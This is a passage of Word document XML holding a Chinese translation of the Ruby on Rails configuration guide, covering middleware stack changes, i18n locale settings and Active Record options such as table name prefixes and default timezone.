            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17EC2380"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所有的中间件也可以被完全移除并替换成其它的:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="6E2EE330" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="591AA4BE" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="221599684"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.middleware.swap ActionDispatch::BestStandardsSupport, Magical::Unicorns</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17CEA44C"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它们也能完全从堆栈中被移除.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="2402EBDB" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D81B4D3" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="750464183"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.middleware.delete ActionDispatch::BestStandardsSupport</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1F1EE4F0"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除了这些操作堆栈的方法，如果你的应用程序只作为一个 API 端的话，中间件堆栈可以像这样设置:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="0E7433A2" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F417D63" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="627442779"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.middleware.http_only!</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1AED7A49"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通过这样做，Rails将会创建一个更小的中间件堆栈，这个堆栈中不会添加一些通常对浏览器访问有用的中间件, 比如 Cookies, 会话，闪存(Flash), BestStandardsSupport 和 MethodOverride. 你可以手动添加它们。查阅 </w:t>
      </w:r>
      <w:hyperlink r:id="rId874" w:history="1">
        <w:r w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>API App docs</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可以获得更多关于如何设置你API应用程序的信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23791159"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3.5 配置 i18n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769B3A1A" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="158"/>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config.i18n.default_locale</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置某个使用 i18n 应用程序的默认本地语言环境。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:en</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C10EF2E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="159"/>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config.i18n.load_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置 Rails 用来搜索本地化文件的路径。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/locales/*.{yml,rb}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B49BBD"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3.6 配置 Active Record</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC78E4E"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w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 包括了下列配置选项:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11AB2EDD" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="160"/>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config.active_record.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个符合 Log4r 或者 Ruby 默认日志类 接口的日志类, 并会被传递给任何新建立的数据库连接. 你可以通过调用 Active Record 模型类或者示例的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来取得这个日志类. 默认设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 以取消日志记录.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3196AB" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16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config.active_record.primary_key_prefix_type</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 让你调整主键栏的名字。默认情况下， Rails 假设主键栏被命名为</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">(这个配置选项不需要设置。) 。还有两个其它选择: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6E1BC6" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="16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:table_name</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将 Customer 类的主键栏命名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>customerid</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072C6C4D" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="16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:table_name_with_underscore</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将 Customer 类的主键栏命名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>customer_id</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4372A1" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16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config.active_record.table_name_prefix</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 让你设置一个全局字符串附加到表名前面. 如果你这个字符串设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>northwest_</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 那么 Customer 类将寻找 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>northwest_customers</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表作为它的表. 默认是一个空字符串.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C916E39" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16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config.active_record.table_name_suffix</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 让你设置一个全局字符串附加到表名后面. 如果你将它设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_northwest</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 那么 Customer 类将会找到 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>customers_northwest</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为它的表. 默认是一个空字符串.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423E2B1E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="164"/>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config.active_record.pluralize_table_names</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定 Rails 是否以使用单复数的表名. 如果设置为 true (默认值), 那么 Customer 类将会使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>customers</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表. 如果设置为 false, 那么 Customer 类将会使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>customer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6608F064" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16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config.active_record.default_timezone</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 当从数据库获取日期和时间时,决定是否使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Time.local</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (如果设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:local</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">) 还是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Time.utc</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (如果设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:utc</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">). 虽然 Active Record 在 Rails 以外使用时默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:local</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 但在 Rails 中默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:utc</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFB2C01" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16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config.active_record.schema_format</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制将数据库结构导出到文件的格式。选项分别是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:ruby</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">(默认)，与数据库无关的选项但与 migrations 相关. 或者是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:sql</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, 一连串 (大部分情况是与数据库相关的) SQL 语句.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D40FFB" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16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config.active_record.timestamped_migrations</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
